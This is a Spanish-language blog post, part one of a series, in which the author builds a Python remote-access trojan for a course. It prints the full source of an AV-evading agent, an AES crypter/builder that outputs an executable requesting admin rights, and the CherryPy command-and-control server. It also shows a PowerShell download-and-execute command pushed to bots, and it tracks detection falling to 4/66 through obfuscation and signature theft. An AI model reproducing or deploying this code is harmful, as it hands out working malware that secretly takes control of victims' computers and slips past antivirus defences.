---
title: RATas y serpientes (Parte I)
date: 2017-11-04 19:24:06 +0100
layout: post
tags:
- python
- malware
---
## Un viaje por las alcantarillas

Como parte de los estudios de un curso en el cual nos pedían crear un crypter y un troyano, me he dado un paseo por las alcantarillas de la red. No soy programador y nunca me interesó demasiado el tema de la “administración remota sin consentimiento del cliente” (por llamarlo de alguna forma políticamente correcta).

![Rat snake (Elaphe flavirufa) swallowing a bat](https://farm9.staticflickr.com/8423/7789349690_ee1f0865e3_b.jpg "Rat snake")

_Pavel Kirillov (_[_flickr_](https://www.flickr.com/photos/pasha_k/7789349690)_), (CC BY-SA 2.0)_

El mundo del malware es una zona gris legalmente hablando y la información que consultaba hasta entonces enfoca el tema desde el lado de reversing y de análisis. Aunque no cuesta demasiado encontrar recursos de creación de cualquier tipo de bicho - de rootkits a ransomware, para alguien que no sepa programar, el primer problema que se planta es por dónde empezar.

En los foros underground hay un montón de tutoriales sobre cómo crear troyanos en Visual Basic, AutoIt, .net, Java, C ó Assembler y en cientos de hilos tanto activos como abandonados con discusiones sobre sus supuestos pros y contras. Hay hilos donde se ofrecen crypters y troyanos ya creados para su modificación y uso -  tanto libre como de pago por el servicio prestado.

Está claro que el punto en común que tienen todos los RATs es que deben ser funcionales e indetectables por los productos antivirus, pero hay muchos matices y preferencias, hay mercado y hay mentes libres, se juntan ignorantes y novatos, gente con ganas de aprender y gente capaz de crear auténticas maravillas de crimeware para los fines que crean convenientes. Un mundo de mercado, de crimen organizado, y de estados opresores, pero también de la anarquía, del aprendizaje y del desafío a la autoridad.

Recomiendo leer [artículos](https://www.endgame.com/blog/technical-blog/badrabbit-technical-analysis) [de](https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/) [análisis](https://www.malwaretech.com/2016/02/necursp2p-hybrid-peer-to-peer-necurs.html) [de](https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/) [malware](http://www.pwc.co.uk/issues/cyber-security-data-privacy/research/the-keyboys-are-back-in-town.html) para aprender sobre los distintos mecanismos de evasión de antivirus, de [propagación](https://www.malwaretech.com/2016/05/dridex-updates-payload-distribution.html) y de [persistencia](https://blog.malwarebytes.com/threat-analysis/2016/07/untangling-kovter/). Me encanta leer, pero… **¿qué mejor manera de aprender sobre algo que creándolo uno mismo?**

### Recursos

El tema es tan amplio que resulta imposible abarcar en un simple artículo, así que solo voy a dar unas pautas de por dónde empezar:

#### Para Leer

En el blog de Security by Default hay una serie de excelentes artículos de introducción:

* [Introducción a los 'crypters'](http://www.securitybydefault.com/2013/07/introduccion-los-crypters.html)

* [Funcionamiento de los 'crypters'](http://www.securitybydefault.com/2013/07/funcionamiento-de-los-crypters.html)

* [El 'Stub': la pieza clave del 'crypter'](http://www.securitybydefault.com/2013/08/el-stub-la-pieza-clave-del-crypter.html)

* [Modding 'Crypters': el arte de la evasión](http://www.securitybydefault.com/2013/08/modding-crypters-el-arte-de-la-evasion.html)

* ['CRYPTERS': practicando la técnica dsplit/Avfucker](http://www.securitybydefault.com/2013/09/crypters-practicando-la-tecnica.html)

…y más:

* [A study of RATs, de Veronica Valeros](https://www.veronicavaleros.com/blog/2017/10/27/a-study-of-rats)

* [Métodos de evasión de firmas antivirus](https://foro.elhacker.net/analisis_y_diseno_de_malware/metodos_de_evasion_de_firmas_antivirus_enelpc-t438285.0.html)

* [Practical Malware Analysis de Kris Kendall y Chad McMillan](https://www.blackhat.com/presentations/bh-dc-07/Kendall_McMillan/Presentation/bh-dc-07-Kendall_McMillan.pdf)

* [Los slides de “Breaking Antivirus Software”](http://joxeankoret.com/download/breaking_av_software_44con.pdf) de [Joxean Koret](https://www.twitter.com/matalaz)

* [Reverse Engineering Malware 101](https://securedorg.github.io/RE101/) de [@malwareunicorn](https://www.twitter.com/malwareunicorn)

* [El libro Practical Malware Analysis](https://www.nostarch.com/malware)

#### Para Ver

Recomiendo leer también los comentarios, ya que en los hilos se plantean algunas cuestiones interesantes.

Videos de ponencias que profundizan sobre la evasión de antivirus:

* [The Art of Evading Antivirus](https://www.youtube.com/watch?v=XdfF5swMvrg)

* [Basic Anti-Virus Bypass Techniques](https://www.youtube.com/watch?v=S8kCCeCEALE)

* [TROOPERS14 - Easy Ways To Bypass Anti-Virus Systems - Attila Marosi](https://www.youtube.com/watch?v=Sl1Sru3OwJ4)

* [ROPInjector: Using Return Oriented Programming For Polymorphism And Antivirus Evasion](https://www.youtube.com/watch?v=YYbI8hbhrSY)

* [Thead Not Found, Matando los Antivirus](https://www.youtube.com/watch?v=XpcJ9Jd4Ud0) ([Slides](https://speakerdeck.com/sheilaberta/threat-not-found-owasp-patagonia))

* [Los videos del canal MalwareAnalysisForHedgehogs](https://www.youtube.com/channel/UCVFXrUwuWxNlm6UNZtBLJ-A/playlists)

#### Comunidad

Algunos foros donde se tratan temas de malware/modding/programación.

* [Level23Hacktools](http://level23hacktools.com/forum/)

* [Indetectables](https://www.indetectables.net/forum.php)

* [Underc0de](https://underc0de.org/foro/)

* [hackxcrack](https://foro.hackxcrack.net)

* [Hackplayers](http://foro.hackplayers.com)

* [0x00sec.org](https://0x00sec.org/)

Y por supuesto hay cientos más… ¡encuéntralas! ¿Porque limitarse solo al castellano e inglés? Usa el traductor de Google. ¿Quizás aprender un poco de ruso es demasiado, pero portugués o italiano? Los canales de telegram son una buena fuente de recursos gratuitos y buenos consejos.

Conviene comportarse, leer las reglas de cada comunidad y evitar las preguntas tontas (_¡sí, existen las preguntas tontas!_). No preguntes antes de haber investigado tú mismo y haber usado la función de búsqueda. Quedarás mal antes todos.

#### Laboratorio de malware

Para investigar malware es conveniente crear un laboratorio de máquinas virtuales.

* [Using VMware for Malware Analysis](https://zeltser.com/vmware-malware-analysis/)

* [malboxes](https://www.fireeye.com/blog/threat-research/2017/07/flare-vm-the-windows-malware.html) - una herramienta para crear máquinas virtuales funcionales y seguras

* [FlareVM](https://www.fireeye.com/blog/threat-research/2017/07/flare-vm-the-windows-malware.html) – una distribución de seguridad basada en Windows, de acceso libre y de libre acceso, diseñada para la ingeniería inversa, análisis de malware e investigación forense

* [Building a Home Lab to Become a Malware Hunter - A Beginner’s Guide](https://www.alienvault.com/blogs/security-essentials/building-a-home-lab-to-become-a-malware-hunter-a-beginners-guide)

* El libro [“Building Virtual Machine Labs”](https://leanpub.com/avatar) de [@da_667](https://www.twitter.com/da_667)

* [Máquinas virtuales de Microsoft](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)

* [Microsoft Windows and Office ISO Download Tool](https://www.heidoc.net/joomla/technology-science/microsoft/67-microsoft-windows-and-office-iso-download-tool)

#### Herramientas

Se puede perder mucho tiempo en la búsqueda de herramientas que a primera vista parecen imprescindibles. No lo son y casi siempre hay [una alternativa](https://www.alternativeto.net), pero dejo aquí unos recursos que al principio cuesta encontrar (un consejo: [apunta las contraseñas](https://keepassxc.org)) de los archivos comprimidos):

* [malwareanalysis.tools](http://malwareanalysis.tools/)

* [Megapack Modding Tools de fudmario](http://www.sniferl4bs.com/2014/02/conociendo-sobre-malware-vi-mega-pack.html)

* FLM Antinub (Encoder/Decoder Pack) `hxxp://www.connect-trojan DOT net/2016/01/flm-antinub-v1.0-tools-encoder-and-decoder.html` _(¡Cuidado con esta página!)

* [Microsoft Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

* [Ronda OCX](https://indetectables.net/viewtopic.php?t=19419)

#### Apuntes

El mejor recurso sin embargo es la investigación propia, hacer apuntes sobre todo que uno vaya encontrando y la experimentación.

Suelo usar el software [CherryTree](http://www.giuspen.com/cherrytree/), para estructurar los apuntes y tenerlos a mano de una forma ordenada que facilita la búsqueda. Otra opción es [TiddlyWiki](http://tiddlywiki.com), una mezcla de cuaderno y wiki y cuaderno personal.

![]({{ site.baseurl }}/forestryio/images/CherryTree0.38.2-1.png)

Recomiendo hacer copias de respaldo de los archivos descargados, snapshots de máquinas virtuales e incluso archivar las páginas web [antes de que desaparezcan](http://archive.is/).

#### Seguridad operacional

Ante todo – seguridad, porque **si juegas con fuego te puedes quemar**. Ten asumido que tarde o temprano [tú también “caerás”](https://decentsecurity.com/how-you-get-infected/). Ten preparado todo para este caso. Usa una máquina dedicada a la investigación de malware e intenta no mezclar tu vida privada con tu vida “profesional”. Ten cuidado [en los viajas](https://www.zdziarski.com/blog/?p=6918) y en lugares públicos.

Aprende lo básico sobre la Seguridad Operacional ([OPSEC – Introducción a la seguridad operacional](https://www.fwhibbit.es/opsec-introduccion-a-la-seguridad-operacional) y [OPSEC - Compartimentalización, identidades y dominios de seguridad](https://www.fwhibbit.es/opsec-compartimentalizacion-identidades-y-dominios-de-seguridad)).

Mantén [limpio, actualizado y seguro tu sistema operativo](https://decentsecurity.com/securing-your-computer/), usa [Sandboxie](https://www.sandboxie.com/) para ejecutables sospechosos, una [conexión segura](https://www.privacytools.io/#vpn) y [asegura tu red local](https://store.pfsense.org).

### Manos a la obra – El troyano

Después de echar un vistazo a troyanos programados en otros idiomas decidí quedarme con Python, contrario a Java, Visual Basic o C# me resulta más fácil comprender lo que hace cada línea de código. Además, no iba a perder el tiempo reinventando la rueda del concepto cliente servidor (que por cierto está [muy bien explicado aquí](https://www.fwhibbit.es/python-hacking-simple-cliente-servidor) y [también aquí](http://www.semecayounexploit.com/?sec=python&nota=19)) y me encontré con un excelente ejemplo en github:

![]({{ site.baseurl }}/forestryio/images/9txG0bl.png)

[Ares - Python botnet and backdoor](https://github.com/sweetsoftware/Ares) de [sweetsoftware](https://github.com/sweetsoftware), modular e independiente de plataforma. Perfecto para destriparlo como ejemplo.

#### Preparación del laboratorio

Dos máquinas de Windows 10 totalmente actualizados; una para hacer de víctima, la otra para montar el malware y hacer de atacante. Es importante apagar la telemetría y el envío de muestras de defender tanto en los guests como en el host.

Lo siguiente es instalar Python ([este tutorial lo explica bastante bien](https://matthewhorne.me/how-to-install-python-and-pip-on-windows-10/), aunque en este caso usaré la versión 2.7), el [Microsoft Visual C++ Compiler para Python 2.7](http://www.microsoft.com/en-us/download/details.aspx?id=44266), las dependencias (requests, cherrypi, [pythoncom](https://superuser.com/questions/609447/how-to-install-the-win32com-python-library), [pyHook](https://stackoverflow.com/questions/32446146/import-pyhook-failed/35118829), [PIL](https://www.lfd.uci.edu/\~gohlke/pythonlibs/#pil)) y [pyinstaller](http://www.pyinstaller.org/).

#### Ares, el padre

Ares viene en dos partes:

1. **El servidor de Command and Control** (CnC), básicamente una interfaz web para administrar a los agentes (clientes, bots, troyanos, …cada uno lo llama como quiera)

2. **El “agente”** (agent.py), el programa que corre en un host comprometido y comunica con el CnC. [Mediante módulos](https://github.com/sweetsoftware/Ares/tree/master/agent/python/modules) se añaden funciones como ddos, persistencia, keylogging o capturas de pantalla.

Tanto para agente como para el servidor hay un fichero de configuración `agent/settings.py y server/conf/server.conf` donde se definen bot-ids, puertos y opciones de debugging entre otras.

El server se arranca con un python server.py desde la consola:

`pyinstaller --onefile --noconsole agent.py`

Se crea un archivo inflado de casi 9 MB, que es bastante para las pocas funciones que lleva lamenta un usuario del foro underc0de:

![]({{ site.baseurl }}/forestryio/images/2017-10-30 16_10_53-Ares-Python Botnet - Underc0de - Hacking y seguridad informática - Opera.png)

Pasando el ejecutable por Virustotal nos podemos dar cuenta de que es [detectado por 20 de 67 productos](https://www.virustotal.com/#/file/477ccacf8455563a8f5ae700fdc88a39331b8823639a8c4509ce9871148a72ed/detection), aunque eso no es mucho y algunos importantes ni siquiera lo detectan (cuando lleva años como código abierto en github y no fue actualizado desde junio 2016). A primera vista es cierto y deja bastante que desear, pero vamos viendo si se pueden mejorar algunos aspectos creando a…

#### Antiope, la hija

De una cierta admiración por cómo está hecho Ares nace la idea de crearle una hija – Antiope. Más ligera y menos detectable, más bonita, pero también menos madura. No es ni producto, ni arma, solo un un experimento para aprender sobre malware.

Primero pondré a Antiope bajo régimen.  La idea es quitarle todos los módulos, el debugging y la ayuda integrada.

Lo de [upx](https://upx.github.io/) no es cierto ya que con el empaquetador instalado, pyinstaller uso la compresión upx por defecto (para compilar sin upx hay que especificar el no-uso con`--noupx`) Se puede reducir el tamaño del fichero de 7.6 MBs, aunque el uso de upx aparentemente lo hace más sospechoso para [21 de 67](https://www.virustotal.com/#/file/bd0aa68aa9f74ae2a1c3ea7e7684868ba52f01b717b3262234611a245fab6474/detection) productos.

![]({{ site.baseurl }}/forestryio/images/Thead Not Found, Matando los Antivirus - DragonJAR Security Conference - YouTube.png)

Vamos a probarlo otra vez, esta vez usando el módulo [PyCrypto](https://pypi.python.org/pypi/pycrypto/) de python. No esperamos grandes resultados, ya que encriptar el malware [tiene sus desventajas](https://youtu.be/XpcJ9Jd4Ud0?t=44m32s).

`pyinstaller --onefile –noconsole –key=JT965BQRTP4MEAN3 agent.py`

[El tercer test](https://www.virustotal.com/#/file/1f8d11c5c19a5319bfb4ea2c61a7b11db082bbbdeb3a8a67276a848009fb841e/detection) contra virustotal hace sospechar que se detecta alguna característica más que algo de Ares en concreto, ya que el troyano es identificado o como Strictor, Shelma o Generic/Spy.Gen.

Así que vamos a quitar las funciones poco a poco, empezando por y la función de persistencia y la de captura de pantalla. El tamaño se reduce a la mitad y las firmas a [19 de 67](https://www.virustotal.com/#/file/f88d407ed8f07d3202ba121005c34e04353b98a220dca245fae612d9eb7acfae/detection):

![]({{ site.baseurl }}/forestryio/images/2017-10-30 17_17_56-Malware Clone 10x64USB - VMware Workstation.png)

¿Y si quitamos las cadenas cantosas y los módulos de download y upload, para quedarnos solo con un agente que conecta al CnC y espera a comandos?

[11 de 67!](https://www.virustotal.com/#/file/ccb9b08e888af6dea670074a47bd2449bccaffcb8d432bb4e38119c1a2b12b2d/detection)

![]({{ site.baseurl }}/forestryio/images/2017-10-31 17_18_43-Malware Clone 10x64USB - VMware Workstation.png)

Hora de mirar por donde falla. Analizar el ejecutable en [reverse.it](https://www.reverse.it/sample/ccb9b08e888af6dea670074a47bd2449bccaffcb8d432bb4e38119c1a2b12b2d?environmentId=100) puede dar muchas pistas sobre las banderas que se levantan por comportamientos típicos de un malware (como por ejemplo empaquetado, acceso al registro para sacar la id del sistema, ...):

![]({{ site.baseurl }}/forestryio/images/2017-10-31 17_20_45-Malware Clone 10x64USB - VMware Workstation.png)

Cambiamos el icono con reshacker y la firma con [sigthief](https://github.com/secretsquirrel/SigThief) y logramos un [8 de 67](https://www.virustotal.com/#/file/d5ff5918518163dc284b713b8dfb2d64b576d0e98dee4a6d8b918e3eaae9011a/detection):

![]({{ site.baseurl }}/forestryio/images/2017-11-03 17_51_51-Malware Clone 10x64USB - VMware Workstation.png)

![]({{ site.baseurl }}/forestryio/images/2017-10-31 17_36_56-Malware Clone 10x64USB - VMware Workstation.png)

Al final he dado una vuelta entera al código y el agente se ha quedado reducido a 40 lineas en comparación con los 83 (+ módulos externos) de ares.

He integrado el módulo`runcmd.py`, para quedarme con solo dos ficheros: `antiope-source.py` (agent.py) y`configs.py` (settings.py), cambiado los nombres de variables (para evitar la detección por cadenas de texto y algunas funciones como:

`output = output.decode('cp1252', errors='replace')`

por

`os_encoding = locale.getpreferredencoding()`

Aunque me da un poco de vergüenza compartir código tan cutre (no soy programador y menos de python), pero aquí lo dejo:

```python

import os, time, requests, sys, platform, locale, socket, configs, re
os_encoding = locale.getpreferredencoding()
time.sleep(2)

def send_output(output):
pathplus1 = "report"
pathplus2 = "/api/"
path = pathplus2 + pathplus1
requests.post(configs.SERVER + path, {'botid': configs.btid, 'output': output})

def run(comm):
stdin, stdout, stderr = os.popen3(comm)
output = stdout.read() + stderr.read()
if os.name == "nt":
    output = output.decode(os_encoding, errors='replace') 
send_output(output)

if __name__ == "__main__":
time.sleep(configs.PAUSE)
last_active = time.time()
is_idle = False
while 1:
    if is_idle:
	time.sleep(configs.REQUEST * 9)
    else:
	time.sleep(configs.REQUEST)
    try:
	pAPI = "/api/pop"
	paraM = "?botid="
	paraM1 = "&sysinfo="
	command = requests.get(configs.SERVER + pAPI + paraM + configs.btid + paraM1 + platform.system() + " " + platform.release()).text
	cmdargs = command.split(" ")
	if command:
	    run(command)
	    last_active = time.time()
	    is_idle = False
	elif time.time() - last_active > configs.IDLE:
	    is_idle = True
    except Exception, exc:
	is_idle = True

```

Logrando un [4/66](https://www.virustotal.com/#/file/ba3f9fb881ed48e9c69d8ae58d77b7fa66010b96e020e40e55a65000b8d50d5a/detection) en virustotal:

![]({{ site.baseurl }}/forestryio/images/2017-11-03 17_49_32-Malware Clone 10x64USB - VMware Workstation.png)

#### El crypter/builder

Para hacer mas manejable y porque el ejercicio me pedía crear un crypter funcional con "interfaz amigable".

Ejemplos de crypters programados en python que me han ayudado mucho:

* [Example-Crypter](https://github.com/Axe-Usa/Example-Crypter) - Example crypter is a project demonstrating how files can be encrypted and injected into memory using a stub file.

* [scantime_py_crypter](https://github.com/guilhermej/scantime_py_crypter) A Scantime Crypter coded in Python 2.7

* [cryptoneed](https://github.com/TheKeyOfficial/cryptoneed/blob/master/cryptoneed.py)

He cogido lo mejor de cada uno de los crypters mencionados y he envuelto la función en una interfaz tkinter. Este es el resultado:

![]({{ site.baseurl }}/forestryio/images/2017-11-04 13_56_24-Malware Clone 10x64USB - VMware Workstation.png)

![]({{ site.baseurl }}/forestryio/images/2017-11-04 13_58_12-Malware Clone 10x64USB - VMware Workstation.png)

Y aquí el código:

```python

import base64, random, string, sys, os, pyaes
from Tkinter import *
import tkinter as tk
import tkSimpleDialog
import tkMessageBox
import tkFileDialog
from Crypto.Cipher import AES
from PIL import ImageTk, Image
from shutil import *
from glob import *

root = Tk()
root.wm_title("Antiope RAT (CHEE Edition) - Bot Builder")
root.config(background = "#111111")
root.geometry("530x280")
root.resizable(width=False, height=False)
root.grid()

img = ImageTk.PhotoImage(Image.open("antiope.gif"))
panel = Label(root, image = img).place(x=-10, y=-10)

def load_file():
    opensource = tkFileDialog.Open(**oopts).show()
    botsource = open(opensource).read()

    cryptedsource = open('cryptedsource.py', mode='w')
    if botsource:
        try:

			BLOCK_SIZE = 32
			PADDING = '{'

			Pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
			Enc = lambda c, m: base64.b64encode(c.encrypt(Pad(m)))
			Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

			def randomKey(bytes):
			    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$[]|?/&") for i in range(bytes)) 
			def randomName():
			    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(3)) 
			def randomAscii():
			    return ''.join(random.choice(string.ascii_letters) for i in range(3)) 

			key = randomKey(32)
			iv =  randomKey(16)
			ck = randomKey(16)

			cipher = AES.new(key, AES.MODE_CBC, iv)

			imports = list()
			lines = list()

			for s in botsource:
				if not s.startswith('#'):
					if 'import' in s:
						imports.append(s.strip())
					else:
						lines.append(s)

			enced = Enc(cipher, "".join(lines))
			b64Name = randomAscii() + randomName()
			aesName = randomAscii() + randomName()

			imports.append('import time, os, requests, sys, platform, socket, locale, settings, re')
			imports.append('from base64 import b64decode as ' + b64Name)
			imports.append('from Crypto.Cipher import AES as ' + aesName)
			random.shuffle(imports)
			cryptedsource.write(';'.join(imports) + "\n")

			cmd = "exec(%s.new(\'%s\', %s.MODE_CBC, \'%s\').decrypt(%s(\'%s\')).rstrip('{'))\n" %(aesName, key, aesName, iv, b64Name, enced)

			cryptedsource.write('exec(%s(\'%s\'))' %(b64Name, base64.b64encode(cmd)))
			cryptedsource.close

			tkMessageBox.showinfo("Successfully generated!", "Sourcecode encrypted and saved.\nYou can build your bot now!")

        except:
            showerror("Open Source File", "Failed to read file\n'%s'" % botsource)
        return

oopts = {}
oopts['title'] = 'Choose Bot Source...'
oopts['filetypes'] = [('Python files', '*.py')]

cryptButton = Button(root, text="Encrypt Bot", command=load_file)
cryptButton.grid(row=0,column=0)
cryptButton.place(x=335, y=10, height=48, width=180)
cryptButton.configure(background="#111111")
cryptButton.configure(foreground="#ccd599")
cryptButton.configure(pady="0")
cryptButton.configure(relief=FLAT)
cryptButton.configure(text='SELECT SOURCE')
cryptButton.configure(width=200)
cryptButton.configure(borderwidth="0")
cryptButton.configure(activebackground="#cc0000")
cryptButton.configure(activeforeground="#111111")

class BuildBotDialog:

    def __init__(self, parent):
        top = self.top = tk.Toplevel(parent)
        self.myLabel = tk.Label(top, text='Enter Server IP')
        self.myLabel.pack()
        self.myEntryBox = tk.Entry(top)
        self.myEntryBox.pack()
        self.myLabel1 = tk.Label(top, text='Enter Server Port')
        self.myLabel1.pack()
        self.myEntryBox1 = tk.Entry(top)
        self.myEntryBox1.pack()
        self.myLabel2 = tk.Label(top, text='Enter BOT-ID')
        self.myLabel2.pack()
        self.myEntryBox2 = tk.Entry(top)
        self.myEntryBox2.pack()         
        self.mySubmitButton = tk.Button(top, text='Build', command=self.send)
        self.mySubmitButton.pack()

    def send(self):
        self.serverip = self.myEntryBox.get()
        self.serverport = self.myEntryBox1.get()
        self.sbotid = self.myEntryBox2.get()
        self.top.destroy()

def buildBot():
    inputDialog = BuildBotDialog(root)
    root.wait_window(inputDialog.top)

    with open('settings.py', 'w+') as saveSettings:
		saveSettings.write('SERVER_URL = "http://' + inputDialog.serverip + ":" + inputDialog.serverport + '"\n')
		saveSettings.write('B0T_ID = "' + inputDialog.sbotid + '"\nIDLE_TIME = 120\nREQUEST_INTERVAL = 10\nPAUSE_AT_START = 1\n' )
		saveSettings.close()
		tkMessageBox.showinfo("Thanks!", "Going to build executable now.\nThis will take some time. Stay tuned...")

		''' def randomword(length):
			letters = string.ascii_lowercase
			return ''.join(random.choice(letters) for i in range(length))

		os.system("pyinstaller --onefile --noconsole --key " + randomword(16) + " --clean --uac-admin --icon=drop.ico -n drop.exe cryptedsource.py")
		'''

		os.system("pyinstaller --onefile --noconsole --noupx --uac-admin --icon=drop.ico -n drop.exe cryptedsource.py")
		copyfile('dist/drop.exe', 'drop.exe')
		filelist = glob(os.path.join(".", "*.spec"))
		for f in filelist:
			os.remove(f)
		filelist = glob(os.path.join(".", "*.pyc"))
		for f in filelist:
			os.remove(f)
		import shutil	
		shutil.rmtree('build', ignore_errors=True)
		shutil.rmtree('dist', ignore_errors=True)
		tkMessageBox.showinfo("Done!", "Your bot is ready.\n Saved as drop.exe!")

buildButton = Button(root, text="Build Bot", command=buildBot)
buildButton.grid(row=0,column=2)
buildButton.place(x=335, y=70, height=48, width=180)
buildButton.configure(background="#111111")
buildButton.configure(foreground="#ccd599")
buildButton.configure(pady="0")
buildButton.configure(relief=FLAT)
buildButton.configure(text='BUILD BOT')
buildButton.configure(width=180)
buildButton.configure(borderwidth="0")
buildButton.configure(activebackground="#cc0000")
buildButton.configure(activeforeground="#111111") 

root.mainloop()
    
```

#### El Servidor CnC

La parte del servidor no he cambiado mucho, ya que viene con todo que se necesita para comunicar con el bot. El CnC usa CherryPy, un framework de HTTP orientado a objetos y una base de datos sqlite3.

![]({{ site.baseurl }}/forestryio/images/2017-11-04 14_32_43-Malware Clone 10x64USB - VMware Workstation.png)

La parte importante de la de comunicación con los bots es la siguiente:

```python

class CNC(object):
    @cherrypy.expose
    @require_admin
    def index(self):
        bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
        output = ""
        for bot in bot_list:
            output += '<tr><td><a href="bot?botid=%s">%s</a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td></tr>' % (bot[0], bot[0], "Online" if time.time() - 30 < bot[1] else time.ctime(bot[1]), bot[2], bot[3],
                bot[0])
        with open("list.html", "r") as f:
            html = f.read()
            html = html.replace("{{bot_table}}", output)
            return html

    @cherrypy.expose
    @require_admin
    def bot(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        with open("bot.html", "r") as f:
            html = f.read()
            html = html.replace("{{botid}}", botid)
            return html

class API(object):
    @cherrypy.expose
    def pop(self, botid, sysinfo):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
        if not bot:
            exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), html_escape(cherrypy.request.headers["X-Forwarded-For"]) if "X-Forwarded-For" in cherrypy.request.headers else cherrypy.request.remote.ip, html_escape(sysinfo)))
        else:
            exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
        if cmd:
            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
            exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), "&gt; " + cmd[0][2], html_escape(botid)))
            return cmd[0][2]
        else:
            return ""

    @cherrypy.expose
    def report(self, botid, output):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))

    @cherrypy.expose
    @require_admin
    def push(self, botid, cmd):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))

    @cherrypy.expose
    @require_admin
    def stdout(self, botid):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        output = ""
        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
        for entry in reversed(bot_output):
            output += "%s\n\n" % entry[2]
        bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
        for entry in bot_queue:
            output += "> %s [...]\n\n" % entry[2]
        return output


```


En vez de tirar por el camino de Ares, que saca su funcionalidad de los módulos, uso únicamente el runcmd para ejecutar comandos de Powershell.

Por ejemplo para la función de descargar y ejecutar un fichero:

HTML:

```html

<div class="botcmd">
<input type="text" name="downloadex" id="downloadex" onkeypress="keypressed(event)" />
<button type="submit" onclick="download_execute()">Download &amp; Execute &raquo;</button>
</div>

```

JavaScript:

```javascript

function download_execute(e) {
    $.post("../api/push", {
        'botid': '{{botid}}',
        'cmd': 'powershell.exe -nop -command "Invoke-Expression ((New-Object Net.WebClient).DownloadString(\'' + $('#downloadex').val() + '\'))"'
    });
    $('#downloadex').val('');
    return false;
}

```

#### Estrenando crypter y server:

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src='https://www.youtube.com/embed/KvPTVs0BRB8' frameborder='0' allowfullscreen></iframe></div>

&nbsp;

¡Voila! Un malware funcional y casi indetectable (hay que tener en cuenta que lo hice con fines educativos; publicando el código y subiendo los samples a virustotal).

En la segunda parte daré otra vuelta a Antiope y me centraré en stagers, binders y en la falsificación de firmas.

Mientras, dejo más material para aprender sobre el lado oscuro de python:

* [Pyherion (Veil 2)](https://www.veil-framework.com/pyherion/)

* [Python v. AV](https://www.scribd.com/document/359546080/ViolentPython-DEFCON-2014-pdf)

* [Unpacking Pyinstaller Packed Python Malware](http://www.sysforensics.org/2015/04/unpacking-pyinstaller-packed-python-malware/)

* [BACK TO THE SOURCE CODE – Forward/Reverse Engineering Python Malware](http://www.primalsecurity.net/back-to-the-source-code-forwardingreverse-engineering-python-malware/)

* [How to decompile files from PyInstaller PYZ file](https://stackoverflow.com/questions/18303122/how-to-decompile-files-from-pyinstaller-pyz-file)

* [How do you reverse engineer an EXE “compiled” with PyInstaller](https://reverseengineering.stackexchange.com/questions/160/how-do-you-reverse-engineer-an-exe-compiled-with-pyinstaller#164)

* [pyREtic](https://github.com/MyNameIsMeerkat/pyREtic) - Framework for in-memory Python bytecode reverse engineering

* [Backdoor 100% indetectable con HanzoInjection ](https://www.fwhibbit.es/backdoor-100-indetectable-con-hanzoinjection)

&nbsp;
_El Castellano no es mi Lengua materna, así que pido disculpas por todos errores gramaticales y ortográficos cometidos!_

&nbsp;
